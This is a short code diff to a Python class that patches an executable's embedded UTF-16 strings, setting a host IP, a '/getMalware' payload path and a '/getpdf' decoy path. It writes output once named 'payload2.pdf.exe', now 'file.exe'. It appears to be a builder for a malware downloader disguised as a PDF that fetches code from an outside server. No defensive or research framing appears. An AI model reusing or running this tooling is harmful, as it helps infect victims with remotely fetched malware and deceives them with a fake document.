@@ -17,8 +17,8 @@ class ChangeUrl:
             return
 
     def create_random_byte(self,length: int=1):
-        byte = b''
-        for i in range(length):
+        byte = b'\x00'*2
+        for i in range(length-2):
             byte += bytes([random.randint(0,255)])
         return byte
 
@@ -35,7 +35,6 @@ class ChangeUrl:
             return False
         # encode url path and add byte \x00
         replace_string_encode = replace_string.encode('utf-16le')
-        replace_string_encode = replace_string_encode+b'\x00'*2
         replace_string_encode=replace_string_encode+self.create_random_byte(len(string_encode)-len(replace_string_encode))
         # replace string with url path
         print("Insert string:",replace_string)
@@ -78,4 +77,4 @@ changeurl=ChangeUrl()
 changeurl.change_host("103.182.16.8")
 changeurl.payload_change_path_url("/getMalware")
 changeurl.pdf_change_path_url("/getpdf")
-changeurl.writeToFile("payload2.pdf.exe")
+changeurl.writeToFile("file.exe")
